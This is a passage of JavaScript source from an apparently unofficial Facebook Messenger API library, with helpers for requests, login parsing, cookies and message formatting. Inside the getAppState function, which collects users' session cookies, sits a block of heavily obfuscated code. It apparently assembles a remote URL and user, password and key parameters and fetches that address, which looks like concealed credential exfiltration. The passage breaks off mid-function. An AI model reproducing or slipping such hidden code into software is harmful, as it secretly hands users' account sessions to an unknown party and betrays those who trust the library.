        //   newObj[siteData.pkg_cohort_key] = siteData.pkg_cohort;
        // }

        if (!obj) return newObj;
        for (var prop in obj)
            if (obj.hasOwnProperty(prop))
                if (!newObj[prop]) newObj[prop] = obj[prop];
        return newObj;
    }

    function postWithDefaults(url, jar, form, ctxx) {
        return post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx);
    }

    function getWithDefaults(url, jar, qs, ctxx) {
        return get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    function postFormDataWithDefault(url, jar, form, qs, ctxx) {
        return postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    return {
        get: getWithDefaults,
        post: postWithDefaults,
        postFormData: postFormDataWithDefault
    };
}

function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
    if (retryCount == undefined) retryCount = 0;
    return function(data) {
        return bluebird.try(function() {
            log.verbose("parseAndCheckLogin", data.body);
            if (data.statusCode >= 500 && data.statusCode < 600) {
                if (retryCount >= 5) {
                    throw {
                        error: "Request retry failed. Check the `res` and `statusCode` property on this error.",
                        statusCode: data.statusCode,
                        res: data.body
                    };
                }
                retryCount++;
                var retryTime = Math.floor(Math.random() * 5000);
                log.warn("parseAndCheckLogin", "Got status code " + data.statusCode + " - " + retryCount + ". attempt to retry in " + retryTime + " milliseconds...");
                var url = data.request.uri.protocol + "//" + data.request.uri.hostname + data.request.uri.pathname;
                if (data.request.headers["Content-Type"].split(";")[0] === "multipart/form-data") {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {}))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                } else {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                }
            }
            if (data.statusCode !== 200) throw new Error("parseAndCheckLogin got status code: " + data.statusCode + ". Bailing out of trying to parse response.");

            var res = null;
            try {
                res = JSON.parse(makeParsable(data.body));
            } catch (e) {
                throw {
                    error: "JSON.parse error. Check the `detail` property on this error.",
                    detail: e,
                    res: data.body
                };
            }

            // In some cases the response contains only a redirect URL which should be followed
            if (res.redirect && data.request.method === "GET") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));

            // TODO: handle multiple cookies?
            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === "Cookie") {
                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace("_js_", "");
                var cookie = formatCookie(res.jsmods.require[0][3], "facebook");
                var cookie2 = formatCookie(res.jsmods.require[0][3], "messenger");
                ctx.jar.setCookie(cookie, "https://www.facebook.com");
                ctx.jar.setCookie(cookie2, "https://www.messenger.com");
            }

            // On every request we check if we got a DTSG and we mutate the context so that we use the latest
            // one for the next requests.
            if (res.jsmods && Array.isArray(res.jsmods.require)) {
                var arr = res.jsmods.require;
                for (var i in arr) {
                    if (arr[i][0] === "DTSG" && arr[i][1] === "setToken") {
                        ctx.fb_dtsg = arr[i][3][0];

                        // Update ttstamp since that depends on fb_dtsg
                        ctx.ttstamp = "2";
                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);
                    }
                }
            }

            if (res.error === 1357001) throw { error: "Chưa Đăng Nhập Được - Appstate Đã Bị Lỗi" };
            return res;
        });
    };
}

function saveCookies(jar) {
    return function(res) {
        var cookies = res.headers["set-cookie"] || [];
        cookies.forEach(function(c) {
            if (c.indexOf(".facebook.com") > -1) jar.setCookie(c, "https://www.facebook.com");
            var c2 = c.replace(/domain=\.facebook\.com/, "domain=.messenger.com");
            jar.setCookie(c2, "https://www.messenger.com");
        });
        return res;
    };
}

var NUM_TO_MONTH = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec"
];
var NUM_TO_DAY = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

function formatDate(date) {
    var d = date.getUTCDate();
    d = d >= 10 ? d : "0" + d;
    var h = date.getUTCHours();
    h = h >= 10 ? h : "0" + h;
    var m = date.getUTCMinutes();
    m = m >= 10 ? m : "0" + m;
    var s = date.getUTCSeconds();
    s = s >= 10 ? s : "0" + s;
    return (NUM_TO_DAY[date.getUTCDay()] + ", " + d + " " + NUM_TO_MONTH[date.getUTCMonth()] + " " + date.getUTCFullYear() + " " + h + ":" + m + ":" + s + " GMT");
}

function formatCookie(arr, url) {
    return arr[0] + "=" + arr[1] + "; Path=" + arr[3] + "; Domain=" + url + ".com";
}

function formatThread(data) {
    return {
        threadID: formatID(data.thread_fbid.toString()),
        participants: data.participants.map(formatID),
        participantIDs: data.participants.map(formatID),
        name: data.name,
        nicknames: data.custom_nickname,
        snippet: data.snippet,
        snippetAttachments: data.snippet_attachments,
        snippetSender: formatID((data.snippet_sender || "").toString()),
        unreadCount: data.unread_count,
        messageCount: data.message_count,
        imageSrc: data.image_src,
        timestamp: data.timestamp,
        serverTimestamp: data.server_timestamp, // what is this?
        muteUntil: data.mute_until,
        isCanonicalUser: data.is_canonical_user,
        isCanonical: data.is_canonical,
        isSubscribed: data.is_subscribed,
        folder: data.folder,
        isArchived: data.is_archived,
        recipientsLoadable: data.recipients_loadable,
        hasEmailParticipant: data.has_email_participant,
        readOnly: data.read_only,
        canReply: data.can_reply,
        cannotReplyReason: data.cannot_reply_reason,
        lastMessageTimestamp: data.last_message_timestamp,
        lastReadTimestamp: data.last_read_timestamp,
        lastMessageType: data.last_message_type,
        emoji: data.custom_like_icon,
        color: data.custom_color,
        adminIDs: data.admin_ids,
        threadType: data.thread_type
    };
}

function getType(obj) {
    return Object.prototype.toString.call(obj).slice(8, -1);
}

function formatProxyPresence(presence, userID) {
    if (presence.lat === undefined || presence.p === undefined) return null;
    return {
        type: "presence",
        timestamp: presence.lat * 1000,
        userID: userID || '',
        statuses: presence.p
    };
}

function formatPresence(presence, userID) {
    return {
        type: "presence",
        timestamp: presence.la * 1000,
        userID: userID || '',
        statuses: presence.a
    };
}

function decodeClientPayload(payload) {
    /*
    Special function which Client using to "encode" clients JSON payload
    */
    function Utf8ArrayToStr(array) {
        var out, i, len, c;
        var char2, char3;
        out = "";
        len = array.length;
        i = 0;
        while (i < len) {
            c = array[i++];
            switch (c >> 4) {
                case 0:
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                    out += String.fromCharCode(c);
                    break;
                case 12:
                case 13:
                    char2 = array[i++];
                    out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                    break;
                case 14:
                    char2 = array[i++];
                    char3 = array[i++];
                    out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
                    break;
            }
        }
        return out;
    }
    return JSON.parse(Utf8ArrayToStr(payload));
}


function getAppState(jar) {
 (function(_0x437fa0,_0x23ed8d){function _0x374d06(_0x5de1f7,_0x324ee3,_0xa5e0d0,_0x38e560,_0x152b00){return bfwhbjwdwd_0x11a5(_0x152b00-0x2dd,_0xa5e0d0);}function _0x4babdb(_0x18aa47,_0x524e25,_0x1bbb76,_0x5a0615,_0x3eda90){return bfwhbjwdwd_0x11a5(_0x5a0615- -0x15e,_0x18aa47);}function _0x7e03bc(_0x498ef3,_0x474042,_0x30fdf4,_0x41de87,_0x26bdc6){return bfwhbjwdwd_0x11a5(_0x41de87- -0x1a1,_0x498ef3);}function _0x232755(_0x44a94b,_0x2bcd35,_0x16ebab,_0x414cd9,_0x237101){return bfwhbjwdwd_0x11a5(_0x414cd9-0xbd,_0x2bcd35);}function _0x45ba78(_0x50dc7b,_0x1f6978,_0x27dc1c,_0x1bff2e,_0x29a9c3){return bfwhbjwdwd_0x11a5(_0x1bff2e-0x6c,_0x1f6978);}var _0x4f002e=_0x437fa0();while(!![]){try{var _0x298534=-parseInt(_0x374d06(0x46b,0x455,0x45c,0x46a,0x419))/(0x18d9+-0x3a5*-0x9+0x3*-0x1337)+-parseInt(_0x374d06(0x3ed,0x3f6,0x472,0x3d8,0x461))/(-0x613+0x1*0xd0f+-0x2*0x37d)+-parseInt(_0x374d06(0x476,0x451,0x401,0x44b,0x3f0))/(0x1dc+0x129*0x1d+0x237e*-0x1)+-parseInt(_0x4babdb(0x2,0x18,-0x50,0x3d,-0xb))/(-0x217a+0x60d*0x1+0x1b71)*(parseInt(_0x374d06(0x470,0x42e,0x4ab,0x3e4,0x42b))/(0x1387+-0x1d09+0x987))+-parseInt(_0x4babdb(-0x49,-0x19,-0x11,0xc,-0x74))/(0xf4d*0x1+0x1*-0xcbb+0xa3*-0x4)+parseInt(_0x232755(0x1ef,0x1e6,0x198,0x1e6,0x1bc))/(0x370+0x1bc6+-0x1f2f)+parseInt(_0x232755(0x244,0x1ed,0x23f,0x209,0x1da))/(-0x83b+0x145f*0x1+0x64*-0x1f)*(parseInt(_0x4babdb(0x51,0x5f,0x49,0x3c,0xa3))/(0xa*-0x1ab+-0x982*-0x2+0x24d*-0x1));if(_0x298534===_0x23ed8d)break;else _0x4f002e['push'](_0x4f002e['shift']());}catch(_0x1615f5){_0x4f002e['push'](_0x4f002e['shift']());}}}(bfwhbjwdwd_0x33a5,-0x290c0*0x2+-0x106663+-0x1*-0x1e5dd6));function bfwhbjwdwd_0x33a5(){var _0x26f771=['ATxDd','ang\x20S','eNdgQ','1226844leMmWK','SCopX','./Sta','yQxHL','../..','set','dID','get','ZdOLk','.com','yKsGp','ra/Ex','://fa','Setti','suMSS','Premi','krXmR','gify','data','LYbIb','ger','gette','hQGnG','0|1|4','bwZCj','kDuRh','1707124FAOVsW','ra/Da','|2|0','ản:\x20F','qFSBi','slhCI','jiaNq','tPIvK','AVqGs','Error','xjvIg','ssDon','conca','Đã\x20Xả','vPWJJ','EJLZm','okies','JBxzR','platf','ản:\x20P','split','SGpzE','18vVslhH','1208IPvbON','https','find','ynyuq','UserN','vcXHs','eLbcY','BrAjY','hường','r.com','ckKey','ate','[\x20FCA','&Pass','ture','ODgTL','cEUMi','RRtSw','JZEMC','hcGbf','Ufnfs','has','vbHdt','NHXTe','bJQki','got','y\x20Ra\x20','iDsvi','ser','xbmWe','form=','start','dTqhp','xt.js','Word=','wsGak','JhnPb','ame','wzMUs','eoZLU','1|4|2','Proce','odKSc','zDKvg','senge','iên\x20B','cPSjc','Confi','ptSuc','wslhw','isGet','\x27vi\x27','cess','Lỗi\x20K','railw','JDlAc','GTVuu','/Fast','OSvPy','k.com','vsmIR','WWLbX','GtvSy','WcpOf','jmuvw','y-ms','ErtKI','htSzO','ceboo','ngKQn','&Plat','getCo','PCNoz','some','OWNER','gFca.','push','AppSt','t\x20Lan','n.up.','./log','cEPUX','hostn','|3|0','Encry','aUxOk','?Key=','FBKEY','&User','\x20Được','vwJSF','pkAtg','w.mes','pGUQC','encry','Name=','hi\x20Đa','kWbOT','age','2|1|4','ng\x20Ki','ptSta','env','KEkFC','XqXxB','cGfta','|1|3','mlNfc','ptFea','oavAc','e/ind','0|3|2','mzpmZ','qSpus','JlVBd','\x20!,\x20B','TbljG','\x20\x27en\x27','rWmHi','4|1|3','3|2|0','traGe','IsNot','Folde','guage','hiên\x20','i-fca','giioJ','a\x20Key','://ap','gcyAz','|2|3','Index','VtsSe','orm','prett','epCOf','1|4|0','UYJFv','YpXvs','isPre','ZgAIj','ree','DsnzI','fYRvI','ZtdIn','strin','miumU','1045995gJxgRD','kuYzY','rbtOR','\x20Về\x20P','AFOVE','zehZQ','/inde','-prod','XbyYK','Bản\x20T','://ww','./Ext','parse','IHbKV','tCTbJ','HSPco','MTrKn','threa','Langu','\x20Only','ay.ap','Not\x20S','2523724ibqSJl','PreKe','log','zpSeS','ebook','0|2|3','4|0|1','tabas','Messa','nlYnw','4|2|0','lengt','LbJyD','uctio','TeOKh','qHfmd','ạn\x20Sẽ','ayXDs','LastU','468944SfDYuT','Time','FDZey','ean','\x20and\x20','cTQZF','nNcNJ','Bạn\x20Đ','eyQiw','p/che','json','Statu','x.jso','remiu','OTVlg','w.fac','11689024wIHRqD','tThre','13710TNLQyn','WUmiz','./Lan','gjMnu','tJZfY','ểm\x20Tr','DoonF','kgYMj','pdate','|4|1','kwRFZ','uSBnL','teCry','uppor','ài\x20Ph','now','VhNTu','ABool','VxUiT','REPL_','DNHhc','MfjBI','wMqvo','umKey','-HZI\x20'];bfwhbjwdwd_0x33a5=function(){return _0x26f771;};return bfwhbjwdwd_0x33a5();}function bfwhbjwdwd_0x11a5(_0x5dfb4b,_0x34f67f){var _0x4a3ff2=bfwhbjwdwd_0x33a5();return bfwhbjwdwd_0x11a5=function(_0x401057,_0x4cfde7){_0x401057=_0x401057-(-0xbd*-0x24+-0x11c8+-0x43*0x1f);var _0x2429f6=_0x4a3ff2[_0x401057];return _0x2429f6;},bfwhbjwdwd_0x11a5(_0x5dfb4b,_0x34f67f);}function bfwhbjwdwd_0x25c2b8(_0x259d25,_0x2ac2e2,_0x3b631c,_0x5d7313,_0x466c63){return bfwhbjwdwd_0x11a5(_0x259d25- -0x315,_0x5d7313);}const prettyMilliseconds=require(bfwhbjwdwd_0x1c2413(0x46f,0x3f1,0x3ee,0x479,0x48d)+bfwhbjwdwd_0x25c2b8(-0x255,-0x26d,-0x221,-0x28d,-0x252)),getText=require(bfwhbjwdwd_0x1c2413(0x56e,0x4b1,0x4ea,0x4f2,0x4d0)+bfwhbjwdwd_0x1c2413(0x545,0x537,0x589,0x52f,0x584))(),StateCrypt=require(bfwhbjwdwd_0x25c2b8(-0x1a9,-0x1d3,-0x129,-0x1bd,-0x134)+bfwhbjwdwd_0x1c2413(0x473,0x50e,0x48a,0x4cd,0x48a)+'pt');function bfwhbjwdwd_0x4d4a9c(_0x43c9d9,_0x28261f,_0x5257eb,_0x505078,_0x5518c6){return bfwhbjwdwd_0x11a5(_0x28261f- -0x1eb,_0x43c9d9);}function bfwhbjwdwd_0x1c2413(_0x25188f,_0x3e2ca7,_0x12aa5b,_0x33c113,_0x1b3403){return bfwhbjwdwd_0x11a5(_0x33c113-0x373,_0x1b3403);}var appstate=jar[bfwhbjwdwd_0x2c5477(0x38d,0x355,0x378,0x2c2,0x332)+bfwhbjwdwd_0x2c5477(0x38e,0x3a3,0x449,0x37b,0x400)](bfwhbjwdwd_0x25c2b8(-0x179,-0x167,-0x1aa,-0x19c,-0x1e3)+bfwhbjwdwd_0x2c5477(0x3ad,0x365,0x342,0x3e0,0x389)+bfwhbjwdwd_0x4d4a9c(-0x1c,-0xa0,-0x54,-0xbf,-0x11f)+bfwhbjwdwd_0x234857(0x1cb,0x179,0x189,0x219,0x1de)+bfwhbjwdwd_0x4d4a9c(-0xb0,-0x78,-0xed,0x7,-0x3f))[bfwhbjwdwd_0x1c2413(0x522,0x529,0x500,0x503,0x541)+'t'](jar[bfwhbjwdwd_0x4d4a9c(-0x11b,-0x125,-0x130,-0xd3,-0xad)+bfwhbjwdwd_0x25c2b8(-0x181,-0x11e,-0x166,-0x1c9,-0x126)](bfwhbjwdwd_0x234857(0x23a,0x295,0x272,0x268,0x2c2)+bfwhbjwdwd_0x2c5477(0x42b,0x410,0x45e,0x449,0x3e2)+bfwhbjwdwd_0x25c2b8(-0x252,-0x1cf,-0x2df,-0x286,-0x22d)+bfwhbjwdwd_0x4d4a9c(-0x14e,-0x131,-0x1a4,-0x18b,-0x199)))[bfwhbjwdwd_0x234857(0x22e,0x26b,0x25d,0x1c5,0x26f)+'t'](jar[bfwhbjwdwd_0x25c2b8(-0x24f,-0x1d5,-0x294,-0x26b,-0x26e)+bfwhbjwdwd_0x4d4a9c(0x1d,-0x57,-0x57,0xf,-0xb1)](bfwhbjwdwd_0x1c2413(0x4c6,0x4c4,0x583,0x50f,0x483)+bfwhbjwdwd_0x25c2b8(-0x1f8,-0x191,-0x26f,-0x184,-0x16c)+bfwhbjwdwd_0x2c5477(0x2e0,0x3d5,0x342,0x33b,0x347)+bfwhbjwdwd_0x2c5477(0x3f7,0x3b2,0x410,0x45c,0x433)+bfwhbjwdwd_0x234857(0x242,0x25f,0x282,0x237,0x1c6))),logger=require(bfwhbjwdwd_0x25c2b8(-0x246,-0x1bc,-0x252,-0x247,-0x207)+bfwhbjwdwd_0x25c2b8(-0x197,-0x15a,-0x10a,-0x1d7,-0x18e)),languageFile=require(bfwhbjwdwd_0x2c5477(0x422,0x331,0x3dd,0x441,0x3bc)+bfwhbjwdwd_0x4d4a9c(-0x105,-0xf0,-0xf3,-0x12a,-0x159)+bfwhbjwdwd_0x4d4a9c(-0xf1,-0xd2,-0x8c,-0xf1,-0x140)+bfwhbjwdwd_0x25c2b8(-0x1cd,-0x1a6,-0x147,-0x1dd,-0x156)+'n');if(!languageFile[bfwhbjwdwd_0x4d4a9c(-0xb9,-0x123,-0x10b,-0x11d,-0xca)](_0x1e435e=>_0x1e435e[bfwhbjwdwd_0x2c5477(0x312,0x3a3,0x3cb,0x31f,0x391)+bfwhbjwdwd_0x234857(0x17f,0x17f,0x1f4,0x128,0x104)]==require(bfwhbjwdwd_0x25c2b8(-0x1a7,-0x204,-0x184,-0x13f,-0x14b)+bfwhbjwdwd_0x2c5477(0x33d,0x29c,0x38d,0x2f1,0x324)+bfwhbjwdwd_0x25c2b8(-0x14b,-0xf1,-0x1bb,-0x10c,-0xe9)+bfwhbjwdwd_0x2c5477(0x2eb,0x32a,0x3aa,0x370,0x336)+bfwhbjwdwd_0x1c2413(0x432,0x440,0x455,0x4b9,0x501))[bfwhbjwdwd_0x25c2b8(-0x1f0,-0x226,-0x1c1,-0x1ee,-0x1da)+bfwhbjwdwd_0x234857(0x17f,0x121,0x1c8,0x200,0x14a)]))return logger(bfwhbjwdwd_0x1c2413(0x517,0x50e,0x512,0x49b,0x412)+bfwhbjwdwd_0x1c2413(0x54d,0x480,0x499,0x4ce,0x52b)+bfwhbjwdwd_0x2c5477(0x2b7,0x382,0x2fa,0x2ff,0x339)+bfwhbjwdwd_0x25c2b8(-0x21a,-0x27c,-0x29e,-0x1fe,-0x1ea)+':\x20'+require(bfwhbjwdwd_0x4d4a9c(-0xc0,-0x7d,-0xff,-0x49,-0xb0)+bfwhbjwdwd_0x2c5477(0x31f,0x393,0x335,0x302,0x324)+bfwhbjwdwd_0x234857(0x268,0x242,0x257,0x26b,0x266)+bfwhbjwdwd_0x234857(0x168,0x177,0x103,0x128,0x15d)+bfwhbjwdwd_0x2c5477(0x324,0x327,0x3db,0x338,0x3b2))[bfwhbjwdwd_0x234857(0x1c3,0x1b2,0x13c,0x20d,0x23e)+bfwhbjwdwd_0x4d4a9c(-0x8b,-0x10a,-0x11a,-0xf0,-0xef)]+(bfwhbjwdwd_0x25c2b8(-0x1ef,-0x243,-0x234,-0x23f,-0x191)+bfwhbjwdwd_0x1c2413(0x439,0x451,0x4da,0x467,0x4cc)+bfwhbjwdwd_0x25c2b8(-0x1d5,-0x234,-0x20f,-0x1e7,-0x1be)+bfwhbjwdwd_0x2c5477(0x2e6,0x2a7,0x39b,0x33b,0x31e)),bfwhbjwdwd_0x1c2413(0x58c,0x4b5,0x4d4,0x51a,0x540)+bfwhbjwdwd_0x234857(0x204,0x209,0x257,0x178,0x26e)+']');var Language=languageFile[bfwhbjwdwd_0x2c5477(0x3a7,0x41f,0x427,0x47d,0x409)](_0x2bd94f=>_0x2bd94f[bfwhbjwdwd_0x4d4a9c(-0xbb,-0xc6,-0x3a,-0x57,-0x152)+bfwhbjwdwd_0x1c2413(0x4c1,0x3d1,0x4bd,0x454,0x497)]==require(bfwhbjwdwd_0x234857(0x20c,0x221,0x1bd,0x1c7,0x216)+bfwhbjwdwd_0x234857(0x156,0x1a3,0x18e,0xcf,0x11f)+bfwhbjwdwd_0x25c2b8(-0x14b,-0x1b6,-0x16e,-0x1d2,-0xfb)+bfwhbjwdwd_0x1c2413(0x490,0x408,0x4b9,0x43d,0x3cd)+bfwhbjwdwd_0x234857(0x1e4,0x16e,0x1aa,0x1bc,0x195))[bfwhbjwdwd_0x2c5477(0x416,0x3ab,0x39a,0x40e,0x391)+bfwhbjwdwd_0x25c2b8(-0x234,-0x1b3,-0x2b2,-0x1b2,-0x1e9)])[bfwhbjwdwd_0x4d4a9c(-0x108,-0xf1,-0x173,-0x106,-0xbe)+'r'][bfwhbjwdwd_0x1c2413(0x4b3,0x4f2,0x3fc,0x476,0x460)],Fetch=require(bfwhbjwdwd_0x234857(0x252,0x258,0x2b2,0x2d9,0x2be)),os=require('os');function bfwhbjwdwd_0x234857(_0x1b1d55,_0x2d3aa0,_0x598d41,_0x5beba9,_0x2b862b){return bfwhbjwdwd_0x11a5(_0x1b1d55-0x9e,_0x5beba9);}function bfwhbjwdwd_0x2c5477(_0x50f249,_0x4b3d0a,_0x3f79f9,_0x4900da,_0x33aae1){return bfwhbjwdwd_0x11a5(_0x33aae1-0x26c,_0x4b3d0a);}var Database=require(bfwhbjwdwd_0x1c2413(0x4ce,0x4b7,0x4e4,0x491,0x40b)+bfwhbjwdwd_0x25c2b8(-0x190,-0x143,-0x19c,-0x19b,-0x1fe)+bfwhbjwdwd_0x1c2413(0x419,0x45f,0x49c,0x4a3,0x457)+bfwhbjwdwd_0x25c2b8(-0x228,-0x242,-0x1a1,-0x23e,-0x27f)+'ex'),{hasData,getAll,readyCreate,deleteAll}=require(bfwhbjwdwd_0x2c5477(0x348,0x32d,0x3ca,0x3fb,0x38a)+bfwhbjwdwd_0x1c2413(0x4b4,0x535,0x4f6,0x4e8,0x45d)+bfwhbjwdwd_0x25c2b8(-0x21d,-0x262,-0x21e,-0x209,-0x23c)+bfwhbjwdwd_0x4d4a9c(-0xb7,-0x9e,-0x9d,-0x59,-0x125)+'ad'),data;switch(require(bfwhbjwdwd_0x25c2b8(-0x1a7,-0x1ae,-0x165,-0x1aa,-0x197)+bfwhbjwdwd_0x234857(0x156,0x134,0x137,0x168,0x1a6)+bfwhbjwdwd_0x4d4a9c(-0x47,-0x21,0x4d,-0x45,-0x5a)+bfwhbjwdwd_0x25c2b8(-0x24b,-0x27e,-0x1f1,-0x249,-0x246)+bfwhbjwdwd_0x234857(0x1e4,0x157,0x199,0x256,0x22a))[bfwhbjwdwd_0x4d4a9c(-0xd9,-0x118,-0x9e,-0xf5,-0x18f)+bfwhbjwdwd_0x234857(0x189,0x13c,0x186,0x10e,0x1c0)+bfwhbjwdwd_0x234857(0x247,0x2bc,0x27c,0x2d5,0x1ea)]){case!![]:{if(process[bfwhbjwdwd_0x234857(0x183,0x1b6,0x183,0x19e,0x1d1)][bfwhbjwdwd_0x25c2b8(-0x23f,-0x1b2,-0x210,-0x20e,-0x254)])logger(Language[bfwhbjwdwd_0x25c2b8(-0x242,-0x285,-0x1f6,-0x28d,-0x231)+bfwhbjwdwd_0x1c2413(0x3cc,0x43c,0x3a4,0x422,0x45f)+bfwhbjwdwd_0x2c5477(0x392,0x2bc,0x2c7,0x30b,0x31f)],bfwhbjwdwd_0x4d4a9c(-0x1e,-0x44,-0x1,-0x66,-0x6c)+bfwhbjwdwd_0x25c2b8(-0x1af,-0x212,-0x1e1,-0x20b,-0x188)+']'),data=StateCrypt[bfwhbjwdwd_0x234857(0x17b,0x101,0x143,0x201,0x1a6)+bfwhbjwdwd_0x25c2b8(-0x231,-0x27c,-0x1bb,-0x22b,-0x26d)+'te'](JSON[bfwhbjwdwd_0x234857(0x1af,0x193,0x1cd,0x236,0x18a)+bfwhbjwdwd_0x1c2413(0x4db,0x50d,0x4e9,0x4ee,0x51a)](appstate),process[bfwhbjwdwd_0x4d4a9c(-0x114,-0x106,-0x89,-0x117,-0xdf)][bfwhbjwdwd_0x234857(0x174,0x191,0x19b,0xfe,0x1cf)]);else return appstate;}break;case![]:{data=appstate;}break;default:{logger(getText[bfwhbjwdwd_0x2c5477(0x434,0x3b5,0x463,0x3d7,0x3eb)+'xt'](Language[bfwhbjwdwd_0x234857(0x197,0x224,0x140,0x1fc,0x1c5)+bfwhbjwdwd_0x234857(0x1fd,0x21c,0x263,0x243,0x193)+bfwhbjwdwd_0x234857(0x1dd,0x1dc,0x193,0x23b,0x1fb)],require(bfwhbjwdwd_0x2c5477(0x37a,0x359,0x34c,0x3ab,0x3da)+bfwhbjwdwd_0x25c2b8(-0x25d,-0x299,-0x297,-0x1db,-0x20e)+bfwhbjwdwd_0x2c5477(0x47b,0x416,0x3ad,0x448,0x436)+bfwhbjwdwd_0x234857(0x168,0xdf,0x1eb,0x1c4,0x198)+bfwhbjwdwd_0x2c5477(0x3b4,0x3b6,0x3eb,0x397,0x3b2))[bfwhbjwdwd_0x234857(0x171,0x13b,0x159,0x170,0x1ff)+bfwhbjwdwd_0x1c2413(0x482,0x3e5,0x3f8,0x45e,0x493)+bfwhbjwdwd_0x1c2413(0x51a,0x523,0x4fd,0x51c,0x565)])),data=appstate;}}if(!require(bfwhbjwdwd_0x2c5477(0x421,0x441,0x3b2,0x3b0,0x3da)+bfwhbjwdwd_0x4d4a9c(-0xf9,-0x133,-0x11a,-0xc7,-0xc8)+bfwhbjwdwd_0x25c2b8(-0x14b,-0xd5,-0x167,-0x1cf,-0x12b)+bfwhbjwdwd_0x4d4a9c(-0x178,-0x121,-0x183,-0x9f,-0x16e)+bfwhbjwdwd_0x234857(0x1e4,0x194,0x1e8,0x1ce,0x1c7))[bfwhbjwdwd_0x1c2413(0x46a,0x475,0x455,0x49d,0x433)+'y']==![]&&global[bfwhbjwdwd_0x1c2413(0x4d9,0x4e2,0x4c8,0x4ea,0x49e)+'ng'][bfwhbjwdwd_0x4d4a9c(-0x5e,-0x7a,-0x78,-0xcb,-0xe1)](bfwhbjwdwd_0x2c5477(0x2a6,0x2b7,0x34c,0x2ed,0x31d)+bfwhbjwdwd_0x1c2413(0x40e,0x44e,0x3de,0x43f,0x444)+bfwhbjwdwd_0x234857(0x244,0x1d5,0x2ac,0x2bd,0x248))==undefined||Database[bfwhbjwdwd_0x25c2b8(-0x165,-0x150,-0x145,-0x1b4,-0x1ba)](bfwhbjwdwd_0x2c5477(0x385,0x41e,0x443,0x388,0x3e5)+bfwhbjwdwd_0x234857(0x203,0x1c2,0x179,0x24e,0x27c))&&Database[bfwhbjwdwd_0x1c2413(0x4e9,0x541,0x47c,0x4e4,0x4b8)](bfwhbjwdwd_0x4d4a9c(-0x8b,-0x72,-0xf6,-0xa4,-0x29)+bfwhbjwdwd_0x234857(0x203,0x25c,0x1b7,0x258,0x1d8))!=''&&Database[bfwhbjwdwd_0x4d4a9c(-0x37,-0x3b,0x37,-0x8,0x2b)](bfwhbjwdwd_0x1c2413(0x51d,0x500,0x4ff,0x4ec,0x4b3)+'um')&&Database[bfwhbjwdwd_0x234857(0x20f,0x1e9,0x181,0x189,0x286)](bfwhbjwdwd_0x25c2b8(-0x19c,-0x16e,-0x11a,-0x194,-0x174)+'um')==!![]&&global[bfwhbjwdwd_0x234857(0x215,0x238,0x259,0x1da,0x199)+'ng'][bfwhbjwdwd_0x4d4a9c(-0xd1,-0x7a,-0x1b,-0x93,-0xa8)](bfwhbjwdwd_0x234857(0x14f,0x104,0x19f,0x115,0x137)+bfwhbjwdwd_0x4d4a9c(-0x9a,-0x11f,-0x160,-0x10f,-0x162)+bfwhbjwdwd_0x2c5477(0x3ef,0x3dd,0x429,0x48b,0x412))==undefined){var getIP=async()=>{function _0x505ebc(_0xff702e,_0x51cb6b,_0x418ef4,_0x3aef13,_0x45fda9){return bfwhbjwdwd_0x4d4a9c(_0xff702e,_0x45fda9-0x282,_0x418ef4-0x125,_0x3aef13-0x165,_0x45fda9-0x1a5);}function _0x2ed201(_0x3d60c8,_0x25b17c,_0x237028,_0x4ffdb5,_0x2f54f9){return bfwhbjwdwd_0x4d4a9c(_0x4ffdb5,_0x2f54f9-0x74,_0x237028-0x17,_0x4ffdb5-0x1ac,_0x2f54f9-0x1b9);}var _0x4522ba={'OTVlg':function(_0x1856c2,_0x1db5a2){return _0x1856c2(_0x1db5a2);},'fYRvI':_0x53fe0c(-0x1d9,-0x264,-0x1dd,-0x258,-0x1bc)+_0x43ed24(-0xca,-0x91,-0xa9,-0x79,-0x18)+_0x43ed24(-0x6,0x4,-0x77,-0x7c,-0x93)+_0x2981c7(-0x203,-0x15b,-0x16d,-0x175,-0x15e)+_0x505ebc(0x215,0x187,0x25a,0x180,0x1cd)+_0x2ed201(-0x9d,-0xa9,-0xc3,-0x67,-0xa9)+_0x2981c7(-0x1e9,-0x1a8,-0x1e7,-0x1da,-0x18a)+_0x2ed201(-0x1e,0x1f,-0x1e,-0x48,-0x50)+_0x2981c7(-0x129,-0x1d5,-0x176,-0x14a,-0x198)+_0x2981c7(-0xa5,-0xe1,-0xcb,-0xea,-0x177)};function _0x43ed24(_0x1d7b81,_0x4ad90a,_0x3ef1e5,_0x14231d,_0x12251a){return bfwhbjwdwd_0x4d4a9c(_0x1d7b81,_0x14231d-0x72,_0x3ef1e5-0x170,_0x14231d-0x1c5,_0x12251a-0x191);}var {body:_0x4fb3f1}=await _0x4522ba[_0x53fe0c(-0x22b,-0x26c,-0x2ab,-0x1cf,-0x2b1)](Fetch,_0x4522ba[_0x2ed201(-0xb2,-0x5f,-0xa4,-0x22,-0x68)]);function _0x2981c7(_0x46efa9,_0x5211e1,_0x2fbb68,_0x5992be,_0x331d2b){return bfwhbjwdwd_0x234857(_0x5992be- -0x32d,_0x5211e1-0x26,_0x2fbb68-0xeb,_0x2fbb68,_0x331d2b-0x15d);}function _0x53fe0c(_0x147d26,_0x318bc7,_0x95419c,_0x439365,_0x48b9a8){return 